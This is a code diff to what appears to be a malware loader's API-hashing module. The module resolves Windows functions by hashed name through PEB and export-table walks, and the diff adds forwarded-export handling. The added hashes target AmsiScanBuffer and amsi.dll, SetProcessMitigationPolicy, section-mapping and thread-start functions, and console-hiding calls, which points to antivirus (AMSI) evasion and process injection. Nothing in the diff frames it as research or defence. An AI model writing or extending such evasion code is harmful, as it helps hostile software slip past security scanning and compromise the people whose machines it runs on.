@@ -99,15 +99,69 @@ HMODULE GetModuleHandleH(DWORD dwModuleHash) {
 
 /* =========================================================================
  *  Resolving function address from module's IMAGE_EXPORT_DIRECTORY table
+ *
+ *  Forwarded exports (kernel32!ExitThread -> NTDLL.RtlExitUserThread etc.):
+ *  the EAT entry points INTO the export directory at a "MODULE.Function"
+ *  string instead of code.  Returning that RVA as-is makes the caller
+ *  execute ASCII — so forwarders are followed: the module part is hashed
+ *  (wide Djb2, same as GetModuleHandleH's PEB walk), the function part is
+ *  matched by exact name in the target module's EAT.  No DLL loads are
+ *  triggered here — forwarder targets we care about (ntdll/kernelbase)
+ *  are always mapped; anything else returns NULL and the caller soft-fails.
  * ========================================================================= */
+
+/* Exact-name EAT walk — used after following a forwarder, where the target
+ * function name differs from the originally requested (hashed) name. */
+static FARPROC GetProcByNameA(HMODULE hModule, const char* pName) {
+    PBYTE pBase = (PBYTE)hModule;
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
+    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
+
+    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
+    IMAGE_DATA_DIRECTORY ExportDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+    if (!ExportDir.Size || !ExportDir.VirtualAddress) return NULL;
+
+    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pBase + ExportDir.VirtualAddress);
+    PDWORD pAddrOfFunctions = (PDWORD)(pBase + pExport->AddressOfFunctions);
+    PDWORD pAddrOfNames     = (PDWORD)(pBase + pExport->AddressOfNames);
+    PWORD  pAddrOfOrdinals  = (PWORD)(pBase + pExport->AddressOfNameOrdinals);
+
+    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
+        const char* en = (const char*)(pBase + pAddrOfNames[i]);
+        const char* fn = pName;
+        while (*en && *fn && *en == *fn) { en++; fn++; }
+        if (*en == *fn)
+            return (FARPROC)(pBase + pAddrOfFunctions[pAddrOfOrdinals[i]]);
+    }
+    return NULL;
+}
+
+static FARPROC ResolveForwarder(const char* pFwdString) {
+    /* "MODULE.Function" — module part has no extension; append ".dll". */
+    char   modA[40];
+    wchar_t modW[40];
+    int m = 0;
+    const char* p = pFwdString;
+    while (*p && *p != '.' && m < 33) modA[m++] = *p++;
+    if (*p != '.') return NULL;
+    p++;
+    modA[m++] = '.'; modA[m++] = 'd'; modA[m++] = 'l'; modA[m++] = 'l';
+    modA[m] = '\0';
+    for (int i = 0; i <= m; i++) modW[i] = (wchar_t)(unsigned char)modA[i];
+
+    HMODULE hTarget = GetModuleHandleH(HashStringDjb2W(modW));
+    if (!hTarget) return NULL;
+    if (*p == '#') return NULL;   /* ordinal forwarders not needed by our set */
+    return GetProcByNameA(hTarget, p);
+}
 
 FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiHash) {
     if (!hModule) return NULL;
 
     PBYTE pBase = (PBYTE)hModule;
     PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
-    
-    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) 
+
+    if (pDos->e_magic != IMAGE_DOS_SIGNATURE)
         return NULL;
 
     PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
@@ -126,14 +180,18 @@ FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiHash) {
 
     for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
         char* pFuncName = (char*)(pBase + pAddrOfNames[i]);
-		PVOID pFuncAddr = (PVOID)(pBase + pAddrOfFunctions[pAddrOfOrdinals[i]]);
-        
+
         DWORD dwHash = RTIME_HASHA(pFuncName);
         if (dwHash == dwApiHash) {
-            return (FARPROC)(pBase + pAddrOfFunctions[pAddrOfOrdinals[i]]);
+            DWORD frva = pAddrOfFunctions[pAddrOfOrdinals[i]];
+            if (frva >= ExportDir.VirtualAddress &&
+                frva <  ExportDir.VirtualAddress + ExportDir.Size) {
+                return ResolveForwarder((const char*)(pBase + frva));
+            }
+            return (FARPROC)(pBase + frva);
         }
     }
-    
+
     return NULL;
 }
 
@@ -181,6 +239,13 @@ extern "C" {
     DWORD g_Hash_CreateFileW             = 0;
     DWORD g_Hash_GetSystemDirectoryW     = 0;
     DWORD g_Hash_RtlUserThreadStart      = 0;
+    DWORD g_Hash_RtlAddFunctionTable     = 0;
+    DWORD g_Hash_AllocConsole            = 0;
+    DWORD g_Hash_GetConsoleWindow        = 0;
+    DWORD g_Hash_ShowWindow              = 0;
+    DWORD g_Hash_amsi                    = 0;   /* module — wide-char hash, set at runtime */
+    DWORD g_Hash_AmsiScanBuffer          = 0;
+    DWORD g_Hash_SetProcessMitigationPolicy = 0;
 } // extern "C"
 
 CTIME_HASHA(ZwCreateSection)           // ZwCreateSection_Rotr32A
@@ -221,6 +286,12 @@ CTIME_HASHA(LoadLibraryW)              // LoadLibraryW_Rotr32A
 CTIME_HASHA(CreateFileW)               // CreateFileW_Rotr32A
 CTIME_HASHA(GetSystemDirectoryW)       // GetSystemDirectoryW_Rotr32A
 CTIME_HASHA(RtlUserThreadStart)        // RtlUserThreadStart_Rotr32A
+CTIME_HASHA(RtlAddFunctionTable)       // RtlAddFunctionTable_Rotr32A
+CTIME_HASHA(AllocConsole)              // AllocConsole_Rotr32A
+CTIME_HASHA(GetConsoleWindow)          // GetConsoleWindow_Rotr32A
+CTIME_HASHA(ShowWindow)                // ShowWindow_Rotr32A
+CTIME_HASHA(AmsiScanBuffer)            // AmsiScanBuffer_Rotr32A
+CTIME_HASHA(SetProcessMitigationPolicy) // SetProcessMitigationPolicy_Rotr32A
 void ApiHashing_InitHashes(void) {
     /* Module names use the wide-char hasher — must match GetModuleHandleH's
      * PEB LDR walk which hashes BaseDllName (a UNICODE_STRING). */
@@ -267,4 +338,11 @@ void ApiHashing_InitHashes(void) {
     g_Hash_CreateFileW             = CreateFileW_Rotr32A;
     g_Hash_GetSystemDirectoryW     = GetSystemDirectoryW_Rotr32A;
     g_Hash_RtlUserThreadStart      = RtlUserThreadStart_Rotr32A;
+    g_Hash_RtlAddFunctionTable     = RtlAddFunctionTable_Rotr32A;
+    g_Hash_AllocConsole            = AllocConsole_Rotr32A;
+    g_Hash_GetConsoleWindow        = GetConsoleWindow_Rotr32A;
+    g_Hash_ShowWindow              = ShowWindow_Rotr32A;
+    g_Hash_amsi                    = HashStringDjb2W(L"amsi.dll");
+    g_Hash_AmsiScanBuffer          = AmsiScanBuffer_Rotr32A;
+    g_Hash_SetProcessMitigationPolicy = SetProcessMitigationPolicy_Rotr32A;
 }
